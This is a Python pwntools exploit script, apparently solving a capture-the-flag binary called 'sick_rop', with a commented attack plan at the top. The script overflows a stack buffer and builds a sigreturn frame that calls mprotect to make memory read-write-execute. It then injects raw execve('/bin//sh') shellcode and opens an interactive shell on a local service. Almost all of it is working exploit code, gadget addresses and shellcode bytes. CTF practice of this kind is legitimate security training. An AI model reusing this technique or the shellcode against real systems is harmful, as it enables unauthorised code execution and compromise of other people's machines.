##### Plan #####
## Buffer overflow first 
## 1st payload -> padd + vuln address + syscall gadget (eax/rax) to call mprotect to set alloaction memory + sigrop frame (can set rax,rdi,rsi,rdx,rsp,rip) prepare for 2nd payload
## rax -> number of syscall -> mprotect() syscall number
## rdi -> arg1 for mprotect -> address to allocate -> 0x400000
## rsi -> arg2 for mprotect -> length space to allocate -> 0x1000
## rdx -> arg3 for mprotect -> permission -> 0x7 (RWX)
## rsp -> new stack pointer -> point to address that point to vuln()
## rip -> next rip -> syscall gadget
## 2st payload -> padd + stack address contain shellcode + shellcode
## stack address -> point to address that point to vuln() + 0x10 (16 bytes)
## Shellcode we write to allocate memory

from pwn import *

r = remote("127.0.0.1",32791)
# r = process(["../src/chall"])
exe = ELF("../src/chall")

context.arch = "amd64"

offset = 88
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

## ROPgadget --binary ./sick_rop --only "syscall"
syscall_gadget = 0x0000000000401014
vuln_addr = exe.symbols['vuln']

## Need to stop program during run
## pwndbg> search -p 0x40102e (address of vuln)
## sick_rop        0x4010d8 adc    byte ptr cs:[rax], al
## only work if no PIE

vuln_pointer = 0x4010d8

frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_mprotect # mprotect syscall number
frame.rdi = 0x400000 # allocate address
frame.rsi = 0x10000 # length allocate
frame.rdx = 0x7 # RWX
frame.rsp = vuln_pointer
frame.rip = syscall_gadget

log.info("Changing permission for this address for shellcode: " + hex(frame.rdi))
log.info("New RSP address: " + hex(frame.rsp))

print(frame)
print(len(frame))
# gdb.attach(r)

payload1 = b'A'*offset + p64(vuln_addr) + p64(syscall_gadget) + bytes(frame)
r.sendline(payload1)
r.recv()

# set the value of RAX. Because the RAX is long of input to write() so we can control it buy measure the long of input
def set_rax(num):
    # need to -1 due to '\n' will be include in read()
    r.sendline(b'A' * (num - 1))
    r.recv()    # wait for input's echo due to write()

set_rax(0xf) # sigreturn syscall number

payload2 = b'A'*offset + p64(vuln_pointer+0x10) + shellcode
r.sendline(payload2)
r.recv()

r.interactive()
